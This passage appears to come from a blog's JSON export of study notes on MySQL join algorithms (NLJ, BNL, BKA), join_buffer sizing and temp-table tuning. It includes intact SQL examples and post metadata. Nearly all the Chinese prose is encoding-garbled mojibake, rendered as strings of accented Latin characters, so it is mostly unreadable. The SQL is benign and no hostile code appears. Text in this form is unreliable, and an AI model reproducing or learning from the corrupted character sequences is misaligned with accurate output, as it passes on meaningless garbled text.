ç§’åå†æ¬¡è¢«è®¿é—®åˆ°ã€‚ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬çš„ join è¯­å¥åœ¨å¾ªç¯è¯»ç£ç›˜å’Œæ·˜æ±°å†…å­˜é¡µï¼Œè¿›å…¥ old åŒºåŸŸçš„æ•°æ®é¡µï¼Œå¾ˆå¯èƒ½åœ¨ 1 ç§’ä¹‹å†…å°±è¢«æ·˜æ±°äº†ã€‚è¿™æ ·ï¼Œå°±ä¼šå¯¼è‡´è¿™ä¸ª MySQL å®ä¾‹çš„ Buffer Pool åœ¨è¿™æ®µæ—¶é—´å†…ï¼Œyoung åŒºåŸŸçš„æ•°æ®é¡µæ²¡æœ‰è¢«åˆç†åœ°æ·˜æ±°ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸¤ç§æƒ…å†µéƒ½ä¼šå½±å“ Buffer Pool çš„æ­£å¸¸è¿ä½œã€‚ å¤§è¡¨ join æ“ä½œè™½ç„¶å¯¹ IO æœ‰å½±å“ï¼Œä½†æ˜¯åœ¨è¯­å¥æ‰§è¡Œç»“æŸåï¼Œå¯¹ IO çš„å½±å“ä¹Ÿå°±ç»“æŸäº†ã€‚ä½†æ˜¯ï¼Œå¯¹ Buffer Pool çš„å½±å“å°±æ˜¯æŒç»­æ€§çš„ï¼Œéœ€è¦ä¾é åç»­çš„æŸ¥è¯¢è¯·æ±‚æ…¢æ…¢æ¢å¤å†…å­˜å‘½ä¸­ç‡ã€‚ ä¸ºäº†å‡å°‘è¿™ç§å½±å“ï¼Œä½ å¯ä»¥è€ƒè™‘å¢å¤§ join_buffer_size çš„å€¼ï¼Œå‡å°‘å¯¹è¢«é©±åŠ¨è¡¨çš„æ‰«ææ¬¡æ•°ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒBNL ç®—æ³•å¯¹ç³»ç»Ÿçš„å½±å“ä¸»è¦åŒ…æ‹¬ä¸‰ä¸ªæ–¹é¢ï¼š å¯èƒ½ä¼šå¤šæ¬¡æ‰«æè¢«é©±åŠ¨è¡¨ï¼Œå ç”¨ç£ç›˜ IO èµ„æºï¼› åˆ¤æ–­ join æ¡ä»¶éœ€è¦æ‰§è¡Œ M*N æ¬¡å¯¹æ¯”ï¼ˆMã€N åˆ†åˆ«æ˜¯ä¸¤å¼ è¡¨çš„è¡Œæ•°ï¼‰ï¼Œå¦‚æœæ˜¯å¤§è¡¨å°±ä¼šå ç”¨éå¸¸å¤šçš„ CPU èµ„æºï¼› å¯èƒ½ä¼šå¯¼è‡´ Buffer Pool çš„çƒ­æ•°æ®è¢«æ·˜æ±°ï¼Œå½±å“å†…å­˜å‘½ä¸­ç‡ã€‚ æˆ‘ä»¬æ‰§è¡Œè¯­å¥ä¹‹å‰ï¼Œéœ€è¦é€šè¿‡ç†è®ºåˆ†æå’ŒæŸ¥çœ‹ explain ç»“æœçš„æ–¹å¼ï¼Œç¡®è®¤æ˜¯å¦è¦ä½¿ç”¨ BNL ç®—æ³•ã€‚å¦‚æœç¡®è®¤ä¼˜åŒ–å™¨ä¼šä½¿ç”¨ BNL ç®—æ³•ï¼Œå°±éœ€è¦åšä¼˜åŒ–ã€‚ä¼˜åŒ–çš„å¸¸è§åšæ³•æ˜¯ï¼Œç»™è¢«é©±åŠ¨è¡¨çš„ join å­—æ®µåŠ ä¸Šç´¢å¼•ï¼ŒæŠŠ BNL ç®—æ³•è½¬æˆ BKA ç®—æ³•ã€‚ BNL è½¬ BKAä¸€äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¢«é©±åŠ¨è¡¨ä¸Šå»ºç´¢å¼•ï¼Œè¿™æ—¶å°±å¯ä»¥ç›´æ¥è½¬æˆ BKA ç®—æ³•äº†ã€‚ ä½†æ˜¯ï¼Œæœ‰æ—¶å€™ä½ ç¡®å®ä¼šç¢°åˆ°ä¸€äº›ä¸é€‚åˆåœ¨è¢«é©±åŠ¨è¡¨ä¸Šå»ºç´¢å¼•çš„æƒ…å†µã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªè¯­å¥ï¼š 1select * from t1 join t2 on (t1.b&#x3D;t2.b) where t2.b&gt;&#x3D;1 and t2.b&lt;&#x3D;2000; æˆ‘ä»¬åœ¨æ–‡ç« å¼€å§‹çš„æ—¶å€™ï¼Œåœ¨è¡¨ t2 ä¸­æ’å…¥äº† 100 ä¸‡è¡Œæ•°æ®ï¼Œä½†æ˜¯ç»è¿‡ where æ¡ä»¶è¿‡æ»¤åï¼Œéœ€è¦å‚ä¸ join çš„åªæœ‰ 2000 è¡Œæ•°æ®ã€‚å¦‚æœè¿™æ¡è¯­å¥åŒæ—¶æ˜¯ä¸€ä¸ªä½é¢‘çš„ SQL è¯­å¥ï¼Œé‚£ä¹ˆå†ä¸ºè¿™ä¸ªè¯­å¥åœ¨è¡¨ t2 çš„å­—æ®µ b ä¸Šåˆ›å»ºä¸€ä¸ªç´¢å¼•å°±å¾ˆæµªè´¹äº†ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½¿ç”¨ BNL ç®—æ³•æ¥ join çš„è¯ï¼Œè¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š æŠŠè¡¨ t1 çš„æ‰€æœ‰å­—æ®µå–å‡ºæ¥ï¼Œå­˜å…¥ join_buffer ä¸­ã€‚è¿™ä¸ªè¡¨åªæœ‰ 1000 è¡Œï¼Œjoin_buffer_size é»˜è®¤å€¼æ˜¯ 256kï¼Œå¯ä»¥å®Œå…¨å­˜å…¥ã€‚ æ‰«æè¡¨ t2ï¼Œå–å‡ºæ¯ä¸€è¡Œæ•°æ®è·Ÿ join_buffer ä¸­çš„æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œ å¦‚æœä¸æ»¡è¶³ t1.b=t2.bï¼Œåˆ™è·³è¿‡ï¼› å¦‚æœæ»¡è¶³ t1.b=t2.b, å†åˆ¤æ–­å…¶ä»–æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦æ»¡è¶³ t2.b å¤„äº [1,2000] çš„æ¡ä»¶ï¼Œ å¦‚æœæ˜¯ï¼Œå°±ä½œä¸ºç»“æœé›†çš„ä¸€éƒ¨åˆ†è¿”å›ï¼Œå¦åˆ™è·³è¿‡ã€‚ æˆ‘åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­è¯´è¿‡ï¼Œå¯¹äºè¡¨ t2 çš„æ¯ä¸€è¡Œï¼Œåˆ¤æ–­ join æ˜¯å¦æ»¡è¶³çš„æ—¶å€™ï¼Œéƒ½éœ€è¦éå† join_buffer ä¸­çš„æ‰€æœ‰è¡Œã€‚å› æ­¤åˆ¤æ–­ç­‰å€¼æ¡ä»¶çš„æ¬¡æ•°æ˜¯ 1000*100 ä¸‡ =10 äº¿æ¬¡ï¼Œè¿™ä¸ªåˆ¤æ–­çš„å·¥ä½œé‡å¾ˆå¤§ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œexplain ç»“æœé‡Œ Extra å­—æ®µæ˜¾ç¤ºä½¿ç”¨äº† BNL ç®—æ³•ã€‚åœ¨æˆ‘çš„æµ‹è¯•ç¯å¢ƒé‡Œï¼Œè¿™æ¡è¯­å¥éœ€è¦æ‰§è¡Œ 1 åˆ† 11 ç§’ã€‚ åœ¨è¡¨ t2 çš„å­—æ®µ b ä¸Šåˆ›å»ºç´¢å¼•ä¼šæµªè´¹èµ„æºï¼Œä½†æ˜¯ä¸åˆ›å»ºç´¢å¼•çš„è¯è¿™ä¸ªè¯­å¥çš„ç­‰å€¼æ¡ä»¶è¦åˆ¤æ–­ 10 äº¿æ¬¡ï¼Œæƒ³æƒ³ä¹Ÿæ˜¯æµªè´¹ã€‚é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰ä¸¤å…¨å…¶ç¾çš„åŠæ³•å‘¢ï¼Ÿ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸´æ—¶è¡¨ã€‚ä½¿ç”¨ä¸´æ—¶è¡¨çš„å¤§è‡´æ€è·¯æ˜¯ï¼š æŠŠè¡¨ t2 ä¸­æ»¡è¶³æ¡ä»¶çš„æ•°æ®æ”¾åœ¨ä¸´æ—¶è¡¨ tmp_t ä¸­ï¼› ä¸ºäº†è®© join ä½¿ç”¨ BKA ç®—æ³•ï¼Œç»™ä¸´æ—¶è¡¨ tmp_t çš„å­—æ®µ b åŠ ä¸Šç´¢å¼•ï¼› è®©è¡¨ t1 å’Œ tmp_t åš join æ“ä½œã€‚ 123create temporary table temp_t(id int primary key, a int, b int, index(b))engine&#x3D;innodb;insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;select * from t1 join temp_t on (t1.b&#x3D;temp_t.b); å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ªè¿‡ç¨‹ 3 ä¸ªè¯­å¥æ‰§è¡Œæ—¶é—´çš„æ€»å’Œè¿˜ä¸åˆ° 1 ç§’ï¼Œç›¸æ¯”äºå‰é¢çš„ 1 åˆ† 11 ç§’ï¼Œæ€§èƒ½å¾—åˆ°äº†å¤§å¹…æå‡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸€èµ·çœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹çš„æ¶ˆè€—ï¼š æ‰§è¡Œ insert è¯­å¥æ„é€  temp_t è¡¨å¹¶æ’å…¥æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹è¡¨ t2 åšäº†å…¨è¡¨æ‰«æï¼Œè¿™é‡Œæ‰«æè¡Œæ•°æ˜¯ 100 ä¸‡ã€‚ä¹‹åçš„ join è¯­å¥ï¼Œæ‰«æè¡¨ t1ï¼Œè¿™é‡Œçš„æ‰«æè¡Œæ•°æ˜¯ 1000ï¼›join æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œåšäº† 1000 æ¬¡å¸¦ç´¢å¼•çš„æŸ¥è¯¢ã€‚ç›¸æ¯”äºä¼˜åŒ–å‰çš„ join è¯­å¥éœ€è¦åš 10 äº¿æ¬¡æ¡ä»¶åˆ¤æ–­æ¥è¯´ï¼Œè¿™ä¸ªä¼˜åŒ–æ•ˆæœè¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ã€‚æ€»ä½“æ¥çœ‹ï¼Œä¸è®ºæ˜¯åœ¨åŸè¡¨ä¸ŠåŠ ç´¢å¼•ï¼Œè¿˜æ˜¯ç”¨æœ‰ç´¢å¼•çš„ä¸´æ—¶è¡¨ï¼Œæˆ‘ä»¬çš„æ€è·¯éƒ½æ˜¯è®© join è¯­å¥èƒ½å¤Ÿç”¨ä¸Šè¢«é©±åŠ¨è¡¨ä¸Šçš„ç´¢å¼•ï¼Œæ¥è§¦å‘ BKA ç®—æ³•ï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚ æ€»ç»“ BKA ä¼˜åŒ–æ˜¯ MySQL å·²ç»å†…ç½®æ”¯æŒçš„ï¼Œå»ºè®®é»˜è®¤ä½¿ç”¨ BNL ç®—æ³•æ•ˆç‡ä½ï¼Œå»ºè®®éƒ½å°½é‡è½¬æˆ BKA ç®—æ³•ã€‚ä¼˜åŒ–çš„æ–¹å‘å°±æ˜¯ç»™è¢«é©±åŠ¨è¡¨çš„å…³è”å­—æ®µåŠ ä¸Šç´¢å¼• åŸºäºä¸´æ—¶è¡¨çš„æ”¹è¿›æ–¹æ¡ˆï¼Œå¯¹äºèƒ½å¤Ÿæå‰è¿‡æ»¤å‡ºå°æ•°æ®çš„ join è¯­å¥æ¥è¯´ï¼Œæ•ˆæœè¿˜æ˜¯å¾ˆå¥½çš„ MySQL ç›®å‰çš„ç‰ˆæœ¬è¿˜ä¸æ”¯æŒ hash joinï¼Œä½†å¯ä»¥é…åˆåº”ç”¨ç«¯è‡ªå·±æ¨¡æ‹Ÿå‡ºæ¥ï¼Œç†è®ºä¸Šæ•ˆæœè¦å¥½äºä¸´æ—¶è¡¨çš„æ–¹æ¡ˆ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"34 åˆ°åº•å¯ä¸å¯ä»¥ä½¿ç”¨join","slug":"is-it-possible-to-use-join","date":"2022-08-26T06:43:10.000Z","updated":"2023-02-18T03:28:33.602Z","comments":true,"path":"is-it-possible-to-use-join/","link":"","permalink":"https://www.0x2beace.com/is-it-possible-to-use-join/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£æœ‰ç´¢å¼•çš„æƒ…å†µä¸‹ï¼Œjoin çš„è¿‡ç¨‹ äº†è§£æ²¡æœ‰ç´¢å¼•çš„æƒ…å†µä¸‹ï¼Œjoin çš„è¿‡ç¨‹ äº†è§£å‡ ç§ join ç®—æ³•çš„åŒºåˆ«","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£æœ‰ç´¢å¼•çš„æƒ…å†µä¸‹ï¼Œjoin çš„è¿‡ç¨‹ äº†è§£æ²¡æœ‰ç´¢å¼•çš„æƒ…å†µä¸‹ï¼Œjoin çš„è¿‡ç¨‹ äº†è§£å‡ ç§ join ç®—æ³•çš„åŒºåˆ« ä¸ºäº†ä¾¿äºé‡åŒ–åˆ†æï¼Œæˆ‘è¿˜æ˜¯åˆ›å»ºä¸¤ä¸ªè¡¨ t1 å’Œ t2 æ¥å’Œä½ è¯´æ˜ã€‚ 123456789101112131415161718192021222324CREATE TABLE &#96;t2&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;a&#96; int(11) DEFAULT NULL, &#96;b&#96; int(11) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;a&#96; (&#96;a&#96;)) ENGINE&#x3D;InnoDB; drop procedure idata;delimiter ;;create procedure idata()begin declare i int; set i&#x3D;1; while(i&lt;&#x3D;1000)do insert into t2 values(i, i, i); set i&#x3D;i+1; end while;end;;delimiter ;call idata(); create table t1 like t2;insert into t1 (select * from t2 where id&lt;&#x3D;100) å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸¤ä¸ªè¡¨éƒ½æœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼• id å’Œä¸€ä¸ªç´¢å¼• aï¼Œå­—æ®µ b ä¸Šæ— ç´¢å¼•ã€‚å­˜å‚¨è¿‡ç¨‹ idata() å¾€è¡¨ t2 é‡Œæ’å…¥äº† 1000 è¡Œæ•°æ®ï¼Œåœ¨è¡¨ t1 é‡Œæ’å…¥çš„æ˜¯ 100 è¡Œæ•°æ®ã€‚ Index Nested-Loop Joinå…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¯­å¥ï¼š 1select * from t1 straight_join t2 on (t1.a&#x3D;t2.a); è¿™é‡Œæ”¹ç”¨ straight_join è®© MySQL ä½¿ç”¨å›ºå®šçš„è¿æ¥æ–¹å¼æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿™æ ·ä¼˜åŒ–å™¨åªä¼šæŒ‰ç…§æˆ‘ä»¬æŒ‡å®šçš„æ–¹å¼å» joinã€‚åœ¨è¿™ä¸ªè¯­å¥é‡Œï¼Œt1 æ˜¯é©±åŠ¨è¡¨ï¼Œt2 æ˜¯è¢«é©±åŠ¨è¡¨ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™æ¡è¯­å¥çš„ explain ç»“æœã€‚ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™æ¡è¯­å¥é‡Œï¼Œè¢«é©±åŠ¨è¡¨ t2 çš„å­—æ®µ a ä¸Šæœ‰ç´¢å¼•ï¼Œjoin è¿‡ç¨‹ç”¨ä¸Šäº†è¿™ä¸ªç´¢å¼•ï¼Œå› æ­¤è¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š ä»è¡¨ t1 ä¸­è¯»å…¥ä¸€è¡Œæ•°æ® R ä»æ•°æ®è¡Œ R ä¸­ï¼Œå–å‡º a å­—æ®µåˆ°è¡¨ t2 é‡Œå»æŸ¥æ‰¾ å–å‡ºè¡¨ t2 ä¸­æ»¡è¶³æ¡ä»¶çš„è¡Œï¼Œè·Ÿ R ç»„æˆä¸€è¡Œï¼Œä½œä¸ºç»“æœé›†çš„ä¸€éƒ¨åˆ† é‡å¤æ‰§è¡Œæ­¥éª¤ 1 åˆ° 3ï¼Œç›´åˆ°è¡¨ t1 çš„æœ«å°¾å¾ªç¯ç»“æŸ è¿™ä¸ªè¿‡ç¨‹æ˜¯å…ˆéå†è¡¨ t1ï¼Œç„¶åæ ¹æ®ä»è¡¨ t1 ä¸­å–å‡ºçš„æ¯è¡Œæ•°æ®ä¸­çš„ a å€¼ï¼Œå»è¡¨ t2 ä¸­æŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„è®°å½•ã€‚åœ¨å½¢å¼ä¸Šï¼Œè¿™ä¸ªè¿‡ç¨‹å°±è·Ÿæˆ‘ä»¬å†™ç¨‹åºæ—¶çš„åµŒå¥—æŸ¥è¯¢ç±»ä¼¼ï¼Œå¹¶ä¸”å¯ä»¥ç”¨ä¸Šè¢«é©±åŠ¨è¡¨çš„ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œIndex Nested-Loop Joinâ€ï¼Œç®€ç§° NLJã€‚ å¯¹åº”çš„æµç¨‹å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨è¿™ä¸ªæµç¨‹é‡Œï¼š å¯¹é©±åŠ¨è¡¨ t1 åšäº†å…¨è¡¨æ‰«æï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ‰«æ 100 è¡Œ è€Œå¯¹äºæ¯ä¸€è¡Œ Rï¼Œæ ¹æ® a å­—æ®µå»è¡¨ t2 æŸ¥æ‰¾ï¼Œèµ°çš„æ˜¯æ ‘æœç´¢è¿‡ç¨‹ã€‚ç”±äºæˆ‘ä»¬æ„é€ çš„æ•°æ®éƒ½æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå› æ­¤æ¯æ¬¡çš„æœç´¢è¿‡ç¨‹éƒ½åªæ‰«æä¸€è¡Œï¼Œä¹Ÿæ˜¯æ€»å…±æ‰«æ 100 è¡Œ æ‰€ä»¥ï¼Œæ•´ä¸ªæ‰§è¡Œæµç¨‹ï¼Œæ€»æ‰«æè¡Œæ•°æ˜¯ 200 åœ¨çŸ¥é“äº†è¿™ä¸ªè¿‡ç¨‹ä¹‹åï¼Œå†æ¥å›ç­”ä¸€ä¸‹æ–‡ç« å¼€å¤´çš„ä¸¤ä¸ªé—®é¢˜ã€‚ å…ˆçœ‹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šèƒ½ä¸èƒ½ä½¿ç”¨ join? è¿™é‡Œå‡è®¾ä¸ä½¿ç”¨ joinï¼Œé‚£å°±åªèƒ½ç”¨å•è¡¨æŸ¥è¯¢ã€‚æˆ‘ä»¬çœ‹çœ‹ä¸Šé¢è¿™æ¡è¯­å¥çš„éœ€æ±‚ï¼Œç”¨å•è¡¨æŸ¥è¯¢æ€ä¹ˆå®ç°ã€‚ æ‰§è¡Œselect * from t1ï¼ŒæŸ¥å‡ºè¡¨ t1 çš„æ‰€æœ‰æ•°æ®ï¼Œè¿™é‡Œæœ‰ 100 è¡Œ å¾ªç¯éå†è¿™ 100 è¡Œæ•°æ® ä»æ¯ä¸€è¡Œ R å–å‡ºå­—æ®µ a çš„å€¼ $R.a æ‰§è¡Œselect * from t2 where a=$R.a æŠŠè¿”å›çš„ç»“æœå’Œ R æ„æˆç»“æœé›†çš„ä¸€è¡Œ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™ä¸ªæŸ¥è¯¢è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯æ‰«æäº† 200 è¡Œï¼Œä½†æ˜¯æ€»å…±æ‰§è¡Œäº† 101 æ¡è¯­å¥ï¼Œæ¯”ç›´æ¥ join å¤šäº† 100 æ¬¡äº¤äº’ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå®¢æˆ·ç«¯è¿˜è¦è‡ªå·±æ‹¼æ¥ SQL è¯­å¥å’Œç»“æœã€‚ æ˜¾ç„¶ï¼Œè¿™ä¹ˆåšè¿˜ä¸å¦‚ç›´æ¥ join æ¥å¾—æ–¹ä¾¿ã€‚ é‚£ä¹ˆå†æ¥çœ‹çœ‹ç¬¬äºŒä¸ªé—®é¢˜ï¼šæ€ä¹ˆé€‰æ‹©é©±åŠ¨è¡¨ï¼Ÿ åœ¨è¿™ä¸ª join è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé©±åŠ¨è¡¨æ˜¯èµ°å…¨è¡¨æ‰«æï¼Œè€Œè¢«é©±åŠ¨è¡¨æ˜¯èµ°æ ‘æœç´¢ã€‚ å‡è®¾è¢«é©±åŠ¨è¡¨çš„è¡Œæ•°æ˜¯ Mã€‚æ¯æ¬¡åœ¨è¢«é©±åŠ¨è¡¨æŸ¥ä¸€è¡Œæ•°æ®ï¼Œè¦å…ˆæœç´¢ç´¢å¼• aï¼Œå†æœç´¢ä¸»é”®ç´¢å¼•ã€‚æ¯æ¬¡æœç´¢ä¸€æ£µæ ‘è¿‘ä¼¼å¤æ‚åº¦æ˜¯ä»¥ 2 ä¸ºåº•çš„ M çš„å¯¹æ•°ï¼Œè®°ä¸º log2Mï¼Œæ‰€ä»¥åœ¨è¢«é©±åŠ¨è¡¨ä¸ŠæŸ¥ä¸€è¡Œçš„æ—¶é—´å¤æ‚åº¦æ˜¯ 2*log2Mã€‚ å‡è®¾é©±åŠ¨è¡¨çš„è¡Œæ•°æ˜¯ Nï¼Œæ‰§è¡Œè¿‡ç¨‹å°±è¦æ‰«æé©±åŠ¨è¡¨ N è¡Œï¼Œç„¶åå¯¹äºæ¯ä¸€è¡Œï¼Œåˆ°è¢«é©±åŠ¨è¡¨ä¸ŠåŒ¹é…ä¸€æ¬¡ã€‚ å› æ­¤æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼Œè¿‘ä¼¼å¤æ‚åº¦æ˜¯ N + N2log2Mã€‚ æ˜¾ç„¶ï¼ŒN å¯¹æ‰«æè¡Œæ•°çš„å½±å“æ›´å¤§ï¼Œå› æ­¤åº”è¯¥è®©å°è¡¨æ¥åšé©±åŠ¨è¡¨ã€‚ åˆ°è¿™é‡Œå°ç»“ä¸€ä¸‹ï¼Œé€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªç»“è®ºï¼š ä½¿ç”¨ join è¯­å¥ï¼Œæ€§èƒ½æ¯”å¼ºè¡Œæ‹†æˆå¤šä¸ªå•è¡¨æ‰§è¡Œ SQL è¯­å¥çš„æ€§èƒ½è¦å¥½ å¦‚æœä½¿ç”¨ join è¯­å¥çš„è¯ï¼Œéœ€è¦è®©å°è¡¨åšé©±åŠ¨è¡¨ Simple Nested-Loop Joinç°åœ¨ï¼Œæˆ‘ä»¬æŠŠ SQL è¯­å¥æ”¹æˆè¿™æ ·ï¼š 1select * from t1 straight_join t2 on (t1.a&#x3D;t2.b); ç”±äºè¡¨ t2 çš„å­—æ®µ b ä¸Šæ²¡æœ‰ç´¢å¼•ï¼Œå› æ­¤å†ç”¨å›¾ 2 çš„æ‰§è¡Œæµç¨‹æ—¶ï¼Œæ¯æ¬¡åˆ° t2 å»åŒ¹é…çš„æ—¶å€™ï¼Œå°±è¦åšä¸€æ¬¡å…¨è¡¨æ‰«æã€‚ ä½ å¯ä»¥å…ˆè®¾æƒ³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ï¼Œç»§ç»­ä½¿ç”¨å›¾ 2 çš„ç®—æ³•ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç»“æœå‘¢ï¼Ÿå¦‚æœåªçœ‹ç»“æœçš„è¯ï¼Œè¿™ä¸ªç®—æ³•æ˜¯æ­£ç¡®çš„ï¼Œè€Œä¸”è¿™ä¸ªç®—æ³•ä¹Ÿæœ‰ä¸€ä¸ªåå­—ï¼Œå«åšâ€œSimple Nested-Loop Joinâ€ã€‚ ä½†æ˜¯ï¼Œè¿™æ ·ç®—æ¥ï¼Œè¿™ä¸ª SQL è¯·æ±‚å°±è¦æ‰«æè¡¨ t2 å¤šè¾¾ 100 æ¬¡ï¼Œæ€»å…±æ‰«æ 100*1000=10 ä¸‡è¡Œã€‚ è¿™è¿˜åªæ˜¯ä¸¤ä¸ªå°è¡¨ï¼Œå¦‚æœ t1 å’Œ t2 éƒ½æ˜¯ 10 ä¸‡è¡Œçš„è¡¨ï¼ˆå½“ç„¶äº†ï¼Œè¿™ä¹Ÿè¿˜æ˜¯å±äºå°è¡¨çš„èŒƒå›´ï¼‰ï¼Œå°±è¦æ‰«æ 100 äº¿è¡Œï¼Œè¿™ä¸ªç®—æ³•çœ‹ä¸Šå»å¤ªâ€œç¬¨é‡â€äº†ã€‚ å½“ç„¶ï¼ŒMySQL ä¹Ÿæ²¡æœ‰ä½¿ç”¨è¿™ä¸ª Simple Nested-Loop Join ç®—æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨äº†å¦ä¸€ä¸ªå«ä½œâ€œBlock Nested-Loop Joinâ€çš„ç®—æ³•ï¼Œç®€ç§° BNLã€‚ Block Nested-Loop Joinè¿™æ—¶å€™ï¼Œè¢«é©±åŠ¨è¡¨ä¸Šæ²¡æœ‰å¯ç”¨çš„ç´¢å¼•ï¼Œç®—æ³•çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼š æŠŠè¡¨ t1 çš„æ•°æ®è¯»å…¥çº¿ç¨‹å†…å­˜ join_buffer ä¸­ï¼Œç”±äºæˆ‘ä»¬è¿™ä¸ªè¯­å¥ä¸­å†™çš„æ˜¯ select *ï¼Œå› æ­¤æ˜¯æŠŠæ•´ä¸ªè¡¨ t1 æ”¾å…¥äº†å†…å­˜ï¼› æ‰«æè¡¨ t2ï¼ŒæŠŠè¡¨ t2 ä¸­çš„æ¯ä¸€è¡Œå–å‡ºæ¥ï¼Œè·Ÿ join_buffer ä¸­çš„æ•°æ®åšå¯¹æ¯”ï¼Œæ»¡è¶³ join æ¡ä»¶çš„ï¼Œä½œä¸ºç»“æœé›†çš„ä¸€éƒ¨åˆ†è¿”å›ã€‚ è¿™ä¸ªè¿‡ç¨‹çš„æµç¨‹å›¾å¦‚ä¸‹ï¼š å¯¹åº”åœ°ï¼Œè¿™æ¡ SQL è¯­å¥çš„ explain ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¯¹è¡¨ t1 å’Œ t2 éƒ½åšäº†ä¸€æ¬¡å…¨è¡¨æ‰«æï¼Œå› æ­¤æ€»çš„æ‰«æè¡Œæ•°æ˜¯ 1100ã€‚ç”±äº join_buffer æ˜¯ä»¥æ— åºæ•°ç»„çš„æ–¹å¼ç»„ç»‡çš„ï¼Œå› æ­¤å¯¹è¡¨ t2 ä¸­çš„æ¯ä¸€è¡Œï¼Œéƒ½è¦åš 100 æ¬¡åˆ¤æ–­ï¼Œæ€»å…±éœ€è¦åœ¨å†…å­˜ä¸­åšçš„åˆ¤æ–­æ¬¡æ•°æ˜¯ï¼š100*1000=10 ä¸‡æ¬¡ã€‚ å‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œå¦‚æœä½¿ç”¨ Simple Nested-Loop Join ç®—æ³•è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰«æè¡Œæ•°ä¹Ÿæ˜¯ 10 ä¸‡è¡Œã€‚å› æ­¤ï¼Œä»æ—¶é—´å¤æ‚åº¦ä¸Šæ¥è¯´ï¼Œè¿™ä¸¤ä¸ªç®—æ³•æ˜¯ä¸€æ ·çš„ã€‚ä½†æ˜¯ï¼ŒBlock Nested-Loop Join ç®—æ³•çš„è¿™ 10 ä¸‡æ¬¡åˆ¤æ–­æ˜¯å†…å­˜æ“ä½œï¼Œé€Ÿåº¦ä¸Šä¼šå¿«å¾ˆå¤šï¼Œæ€§èƒ½ä¹Ÿæ›´å¥½ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº”è¯¥é€‰æ‹©å“ªä¸ªè¡¨åšé©±åŠ¨è¡¨ã€‚ 